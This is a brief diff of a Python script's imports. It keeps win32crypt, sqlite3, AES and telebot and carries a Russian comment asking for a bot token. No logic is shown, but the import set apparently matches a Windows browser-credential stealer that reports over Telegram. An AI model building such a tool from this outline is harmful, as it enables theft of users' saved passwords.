@@ -4,12 +4,10 @@ import sys
 import sqlite3
 import base64
 import shutil
-import json
 from Crypto.Cipher import AES
 from Crypto.Random import get_random_bytes
 import win32crypt
-import tkinter as tk
-from tkinter import messagebox
+import tkinter
 import telebot
 
 # Замените токен на свой токен бота
